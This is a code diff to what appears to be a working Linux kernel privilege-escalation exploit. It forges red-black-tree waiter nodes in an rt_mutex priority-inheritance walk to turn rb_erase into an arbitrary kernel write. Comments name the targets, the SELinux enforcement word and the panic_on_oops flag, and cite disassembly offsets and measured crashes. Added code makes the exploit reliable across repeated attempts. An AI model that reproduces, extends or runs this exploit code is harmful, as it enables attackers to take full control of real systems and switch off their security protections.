@@ -46,6 +46,56 @@ void kernel5_resident_stop(void) {
     resident_route().stop();
 }
 
+/* One walk = one lock, handed out from the zeroed fixture page.
+ *
+ * rt_mutex_adjust_prio_chain erases our node and -- whenever it takes the update
+ * path (w22 != 0) -- enqueues it again, and rb_add_cached then writes the lock's
+ * own fields:
+ *     0x9c3e71c stp  xzr,xzr,[x28,#8]     node->rb_right = node->rb_left = 0
+ *     0x9c3e720 str  xzr,[x28]            node->__rb_parent_color = 0
+ *     0x9c3e724 str  x28,[x1]             lock+0x08 (waiters.rb_root)  = node
+ *     0x9c3e728 str  x28,[x27,#16]        lock+0x10 (rb_leftmost)      = node
+ * A second walk on that same lock then reads rb_leftmost = node, passes
+ * BUG_ON(w->lock != lock) and takes the inlined rb_next() path
+ * (0x9c3e640 cmp x8,x28 equal -> 0x9c3e65c ldr x10,[x8,#8] -> deref), i.e. it
+ * follows node->rb_right == the word we asked it to store.  Measured: the
+ * 34 s BUG at rtmutex_common.h:118 and the stray rb_leftmost = lock+0x10.
+ *
+ * Re-zeroing the lock between walks cannot work either: a housekeeping shot is
+ * itself a walk, so its store happens before its own enqueue re-dirties
+ * lock+0x08/+0x10 -- the four "clear the field" shots just overwrite each other.
+ *
+ * Therefore every walk gets a pristine, EMPTY rt_mutex_base
+ * {wait_lock@0, waiters.rb_root@+0x08, rb_leftmost@+0x10, owner@+0x18}, taken
+ * from the fixture page that clear_bss() zeroes at each guest boot, with a
+ * non-overlapping 0x20 stride (a walk's +0x08/+0x10 writes stay inside its own
+ * slot) and no reuse: exhausting the table fails the attempt instead of
+ * silently re-arming a dirty lock. */
+static uintptr_t mcast_lease_empty_lock(const MulticastWaiterLayout &layout) {
+    /* Process-local counter is not enough: the harness re-runs the exploit as a
+     * NEW process for every attempt without rebooting (measured: three attempts,
+     * three pids, all leasing lock=0xffffff80035ad600), while the fixture page is
+     * only re-zeroed by clear_bss() at boot.  So the second attempt would inherit
+     * the slot the first attempt's enqueue already dirtied
+     * (rb_root = rb_leftmost = node) -- the 35 s BUG.  Seed the allocation from
+     * the pid so each attempt gets its own area of the page, and fail loudly
+     * (never reuse) once an attempt's slice is used up. */
+    static size_t lease;
+    static size_t base;
+    const uintptr_t bss = memory::resolved_addresses_data_alias(
+            &g_exploit_session.addresses,
+            KIMAGE_TEXT_BASE + layout.fake_bss_image_offset);
+    const uintptr_t first = bss + layout.fake_lock_offset;
+    size_t slots = (layout.fake_task_offset > layout.fake_lock_offset)
+            ? (size_t) (layout.fake_task_offset - layout.fake_lock_offset) / 0x20 : 1;
+    if (!slots) slots = 1;
+    if (!base) base = ((size_t) getpid() * 16) % (slots > 16 ? slots - 16 : 1);
+    const size_t index = base + lease;
+    if (index >= slots) return 0;
+    lease++;
+    return first + index * 0x20;
+}
+
 RouteStatus do_kernel5_fake_lock_route(const WriteRequest *request) {
     (void) request;
     RouteStatus status = {.code = ROUTE_RETRYABLE};
@@ -56,11 +106,29 @@ RouteStatus do_kernel5_fake_lock_route(const WriteRequest *request) {
      * rejects an undersized buffer before any indexed write. */
     __extension__ unsigned char stamp[stamp_size];  // NOLINT(clang-analyzer-core.VLASize)
     memset(stamp, 0, sizeof(stamp));
+    /* Leased per walk: see mcast_lease_empty_lock().  The waiter's lock field
+     * and the walk's lock are the SAME address by construction, and that address
+     * is an empty rt_mutex_base, so neither the identity assert nor the rb_next
+     * trap can trigger. */
+    const uintptr_t lease_lock = mcast_lease_empty_lock(layout);
+    if (!lease_lock) {
+        status.step = 58;
+        status.error_number = ENOSPC;
+        status.userspace_clean = 1;
+        status.kernel_disarmed = 1;
+        pr_warning("fixture lock table exhausted; refusing to reuse a dirty lock\n");
+        return status;
+    }
+    const uintptr_t fake_task = (g_exploit_session.heap.current.fake_task);
+    pr_info("mcast nonresident: page=%#zx fake_task=%#zx lock=%#zx waiter_off=%zu "
+            "task_off=%zu lock_off=%zu buffer=%zu\n",
+            (g_exploit_session.heap.current.base), fake_task, lease_lock,
+            layout.waiter_offset, layout.task_offset, layout.lock_offset,
+            stamp_size);
     if (!encode_multicast_waiter(
             {reinterpret_cast<std::byte *>(stamp), stamp_size},
             layout.waiter_offset, layout.task_offset, layout.lock_offset,
-            (g_exploit_session.heap.current.fake_task), (g_exploit_session.heap.current.fake_lock))) {
-        status.step = 59;
+            fake_task, lease_lock)) {
         status.error_number = EOVERFLOW;
         status.userspace_clean = 1;
         status.kernel_disarmed = 1;
@@ -68,6 +136,42 @@ RouteStatus do_kernel5_fake_lock_route(const WriteRequest *request) {
                    "lock=%zu buffer=%zu\n", layout.waiter_offset,
                    layout.task_offset, layout.lock_offset, stamp_size);
         return status;
+    }
+    {
+        /* The erase words.  rb_erase() climbs rb_parent(node) and, through
+         * rb_change_child(), stores the replacement child pointer there:
+         *   +0x00 __rb_parent_color = (target - 8) & ~3   forged, non-NULL parent
+         *          (and != &tree_entry, so RB_EMPTY_NODE() at 0x9c3e634 does not
+         *           skip the erase)
+         *   +0x08 rb_right           = value, must be non-zero (0 selects the
+         *          rebalance path and never publishes a child through
+         *          rb_change_child)
+         *   +0x10 rb_left            = 0
+         * With those, the call becomes
+         *     parent->rb_right = child(=value)  when *(target)     == node
+         *     parent->rb_left  = child(=value)  when *(target + 8) == node
+         * i.e. *(target) = value for a target that is not our node (the SELinux
+         * word is not).  Leaving tree_entry zeroed instead makes rb_erase find
+         * parent == NULL, so it only clears lock+0x08 and never touches target --
+         * measured as "no crash, no landing" (Write 1 failed, state unchanged). */
+        const uintptr_t erase_parent =
+                (uintptr_t) ((request ? request->target : 0) - 8) & ~(uintptr_t) 3;
+        /* The word comes from the request's own payload layout, not from a global
+         * env: leaf requests (preserve_child == false) leave layout.right == 0 and
+         * therefore publish NULL -- the zero write used to clear a kernel flag
+         * such as panic_on_oops -- while non-leaf requests carry the calibration
+         * word (GHOSTLOCK_WRITE_WORD or page_base + 0x100).  That is what lets a
+         * bootstrap write (zero) and the main W1 write (pointer word) coexist in
+         * one process. */
+        uintptr_t erase_child = (uintptr_t) (g_exploit_session.heap.current.fake_right);
+        if (request && request->target) {
+            const uintptr_t erase_left = 0;
+            memcpy(stamp + layout.waiter_offset + 0x00, &erase_parent, sizeof(erase_parent));
+            memcpy(stamp + layout.waiter_offset + 0x08, &erase_child, sizeof(erase_child));
+            memcpy(stamp + layout.waiter_offset + 0x10, &erase_left, sizeof(erase_left));
+            pr_info("mcast erase words: parent=%#zx right=%#zx left=%#zx\n",
+                    erase_parent, erase_child, erase_left);
+        }
     }
     uint16_t family = AF_UNSPEC;
     memcpy(stamp + 8, &family, sizeof(family));
@@ -343,6 +447,8 @@ RouteStatus TcpZerocopyRoute::execute() noexcept {
         }
         /* consumer fired: the PI walk derefed the crafted waiter and wrote.
          * stages verify their own effects; no cfi stage here. */
+        pr_info("tcp route won seq=%d calls=%d success=%d ret=%d\n",
+                i, calls, success, ret);
         route_won = 1;
         status.code = ROUTE_OK;
         status.step = 0;
